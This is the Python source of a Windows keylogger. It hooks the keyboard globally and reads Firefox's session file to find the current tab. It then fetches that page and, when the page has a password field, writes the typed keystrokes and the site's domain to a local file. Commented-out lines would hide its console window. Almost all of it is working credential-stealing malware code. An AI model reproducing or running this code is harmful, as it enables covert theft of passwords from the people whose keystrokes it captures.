import win32api
import win32console
import win32gui
import pythoncom,pyHook
from win32gui import GetWindowText, GetForegroundWindow
import requests
import json, bs4, re
from urlparse import urlparse
#win=win32console.GetConsoleWindow()
#win32gui.ShowWindow(win,0)
response = requests.get('http://localhost')
soup = bs4.BeautifulSoup(response.text)
def OnKeyboardEvent(event):
	buffer=''
	global pre
	global response
	global soup
	global pw
	print 'en'
	curr=GetWindowText(GetForegroundWindow())
	check='Mozilla Firefox'
	if curr.find(check)>=0:
		print 'pass'
		f = open(r"C:\Users\vignesh\AppData\Roaming\Mozilla\Firefox\Profiles\ifsh50qg.default\sessionstore-backups\recovery.js", "r")
		#f=open(r"D:\output.txt","r");
		jdata = json.loads(f.read())
		f.close()
		op=(jdata["windows"][0]["selected"])
		c=0
		for win in jdata.get("windows"):
			for tab in win.get("tabs"):
				c=c+1
				if op==c:
					i = tab.get("index") - 1
					url=tab.get("entries")[i].get("url")
	
		if pre!=url and url.find('about:')==-1:
			if url.find('http')<0:
				url='http://'+url
			#print url,'1234'
			response = requests.get(url)
			soup = bs4.BeautifulSoup(response.text)
			f=open('d:\output1.txt','a')
			parsed_uri = urlparse(url)
			domain = '{uri.scheme}://{uri.netloc}/'.format(uri=parsed_uri)
			f.write('\n')
			f.write(domain)
			f.write('\n\t')
			f.close()
			pre=url
		elif url.find('about:')!=-1 or curr.find('New Tab')>=0 or re.match('^Mozilla Firefox$',curr)!=None:
			url='http://localhost/m' #a local site having no password field
			response = requests.get(url)
			soup = bs4.BeautifulSoup(response.text)
			pre=url
		#if pre!=url:
			
	##print response.text
	
		
		if event.Ascii==5:
			_exit(1)
		
		print (soup.find(type="password"))!=None,url,soup.title,"xxxxxxxxxxxxxxxxxxxxxxxx"
		print curr, 'qqqq'
		if (event.Ascii !=0 or 8) and (soup.find(type="password"))!=None:
			f=open('d:\output1.txt','a')
			keylogs=chr(event.Ascii)
			if event.Ascii==13:
				keylogs+='\n'
			buffer+=keylogs
		
			f.write(buffer)
			f.close()
			buffer=''
	# create a hook manager object
	
pre=''
hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
